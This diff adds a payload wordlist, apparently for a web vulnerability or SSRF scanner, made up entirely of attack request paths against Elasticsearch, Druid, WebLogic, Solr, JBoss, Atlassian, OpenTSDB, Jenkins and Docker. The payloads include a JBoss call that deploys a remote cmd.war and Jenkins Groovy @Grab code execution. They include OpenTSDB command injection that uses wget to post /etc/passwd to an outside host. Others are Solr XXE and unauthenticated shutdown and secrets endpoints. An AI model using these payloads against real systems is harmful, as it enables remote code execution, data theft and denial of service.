@@ -1,0 +1,39 @@
+/_cluster/health
+/_cat/indices
+/_cat/health
+/_shutdown
+/_cluster/nodes/_master/_shutdown
+/_cluster/nodes/_shutdown
+/_cluster/nodes/_all/_shutdown
+/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2F<DOMAIN>&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
+/uddiexplorer/SearchPublicRegistries.jsp?operator=http://<DOMAIN>/exp%20HTTP/1.11%0AX-CLRF%3A%20Injected%0A&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
+/status/selfDiscovered/status
+/druid/coordinator/v1/leader
+/druid/coordinator/v1/metadata/datasources
+/druid/indexer/v1/taskStatus
+/druid/indexer/v1/task/{taskId}/shutdown
+/druid/indexer/v1/datasources/{dataSource}/shutdownAllTasks
+/druid/indexer/v1/supervisor/terminateAll
+/druid/indexer/v1/supervisor/{supervisorId}/shutdown
+/search?q=Apple&shards=http://<DOMAIN>/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}
+/solr/db/select?q=orange&shards=http://<DOMAIN>/solr/atom&qt=/select?fl=id,name:author&wt=json
+/xxx?q=aaa%26shards=http://<DOMAIN>/solr 
+/xxx?q=aaa&shards=http://<DOMAIN>/solr
+/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://<DOMAIN>/xxx"'><a></a>'
+/xxx?q={!type=xmlparser v="<!DOCTYPE a SYSTEM 'http://<DOMAIN>/solr'><a></a>"}
+/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://<DOMAIN>/utils/cmd.war
+/rest/sharelinks/1.0/link?url=https://<DOMAIN>/
+/plugins/servlet/oauth/users/icon-uri?consumerUri=http://<DOMAIN>
+/plugins/servlet/oauth/users/icon-uri?consumerUri=http://<DOMAIN>
+/plugins/servlet/gadgets/makeRequest?url=https://<DOMAIN>:443@example.com
+/plugins/servlet/oauth/users/icon-uri?consumerUri=http://<DOMAIN>
+/q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20<DOMAIN>%60&style=linespoint&png
+/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('wget%20--post-file%20/etc/passwd%20<DOMAIN>')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
+/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://<DOMAIN>/%23&login=orange&password=tsai
+/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw', root='http://<DOMAIN>/')%0a@Grab(group='tw.orange', module='poc', version='1')%0aimport Orange;
+/proxy.stream?origin=http://<DOMAIN>/
+/containers/json
+/secrets
+/services
+/scrape?target=redis://127.0.0.1:7001&check-keys=*
+
